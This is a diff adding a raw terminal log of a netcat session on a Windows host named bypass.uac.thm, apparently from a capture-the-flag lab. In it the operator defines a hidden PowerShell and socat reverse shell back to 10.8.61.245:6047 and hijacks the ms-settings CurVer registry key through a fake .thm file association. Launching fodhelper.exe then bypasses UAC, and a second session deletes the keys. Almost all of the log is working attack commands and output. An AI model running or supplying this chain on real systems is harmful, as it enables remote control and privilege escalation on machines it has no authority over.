@@ -1,0 +1,38 @@
+Script started on 2025-03-24 11:11:14+03:00 [COMMAND="rlwrap nc bypass.uac.thm 9999" TERM="xterm-256color" TTY="/dev/pts/5" COLUMNS="104" LINES="27"]
+[?2004h[KMicrosoft Windows [Version 10.0.17763.1821]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>[KC:\Windows\system32>[K[?2004hC:\Windows\system32>[7mset CMD="powershell -windowstyle hidden C:\Tools\socat\socat.exe TCP:10.8.61.245:604[27m[7m7[27m[7m EXEC:cmd.exe,pipes"[27m[A[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K
+[K[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[?2004hset CMD="powershell -windowstyle hidden C:\Tools\socat\socat.exe TCP:10.8.61.245:6047 EXEC:cmd.exe,pipes"
+[Kset CMD="powershell -windowstyle hidden C:\Tools\socat\socat.exe TCP:10.8.61.245:6047 EXEC:cmd.exe,pipes"
+
+C:\Windows\system32>[KC:\Windows\system32>[K[?2004hC:\Windows\system32>[7mreg add "HKCU\Software\Classes\.thm\Shell\Open\command" /d %CMD% /f[27m[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hreg add "HKCU\Software\Classes\.thm\Shell\Open\command" /d %CMD% /f
+[Kreg add "HKCU\Software\Classes\.thm\Shell\Open\command" /d %CMD% /f
+[KThe operation completed successfully.
+
+C:\Windows\system32>[KC:\Windows\system32>[K[?2004hC:\Windows\system32>[7mreg add "HKCU\Software\Classes\ms-settings\CurVer" /d ".thm" /f[27m[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hreg add "HKCU\Software\Classes\ms-settings\CurVer" /d ".thm" /f
+[Kreg add "HKCU\Software\Classes\ms-settings\CurVer" /d ".thm" /f
+[KThe operation completed successfully.
+
+C:\Windows\system32>[KC:\Windows\system32>[K[?2004hC:\Windows\system32>[7mfodhelper.exe[27m[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hfodhelper.exe
+[Kfodhelper.exe
+[K
+C:\Windows\system32>[KC:\Windows\system32>[K[?2004hC:\Windows\system32>exit[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hexit
+[Kexit
+[K[?2004l
+Script done on 2025-03-24 11:13:25+03:00 [COMMAND_EXIT_CODE="0"]
+Script started on 2025-03-24 11:18:04+03:00 [COMMAND="rlwrap nc bypass.uac.thm 9999" TERM="xterm-256color" TTY="/dev/pts/5" COLUMNS="104" LINES="27"]
+[?2004h[KMicrosoft Windows [Version 10.0.17763.1821]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>[KC:\Windows\system32>[KHKCU\Softwa[?2004hC:\Windows\system32>[7mreg delete "HKCU\Software\Classes\.thm\" /f[27m
+[7mreg delete "HKCU\Software\Classes\ms-settings\" /f[27m[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K
+[K[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[?2004hreg delete "HKCU\Software\Classes\.thm\" /f
+reg delete "HKCU\Software\Classes\ms-settings\" /f
+[Kreg delete "HKCU\Software\Classes\.thm\" /f
+[KPermanently delete the registry key HKEY_CURRENT_USER\Software\Classes\.thm" /f (Yes/No)? [KPermanently delete the registry key HKEY_CURRENT_USER\Software\Classes\.thm" /f (Yes/No)? [KPermanently delete the registry key HKEY_CURRENT_USER\Software\Classes\.thm" /f (Yes/No)? Permanently delete the registry key HKEY_CURRENT_USER\Software\Classes\.thm" /f (Yes/No)? [K[A[KPermanently delete the registry key HKEY_CURRENT_USER\Software\Classes\.thm" /f (Yes/No)? Permanently delete the registry key HKEY_CURRENT_USER\Software\Classes\.thm" /f (Yes/No)? [K[A[K[?2004hPermanently delete the registry key HKEY_CURRENT_USER\Software\Classes\.thm" /f (Yes/No)? Permanently delete the registry key HKEY_CURRENT_USER\Software\Classes\.thm" /f (Yes/No)? Yes[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hYes
+[K
+C:\Windows\system32>[KC:\Windows\system32>[K[?2004hC:\Windows\system32>exit[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hexit
+[Kexit
+[?2004l
+Script done on 2025-03-24 11:18:17+03:00 [COMMAND_EXIT_CODE="0"]
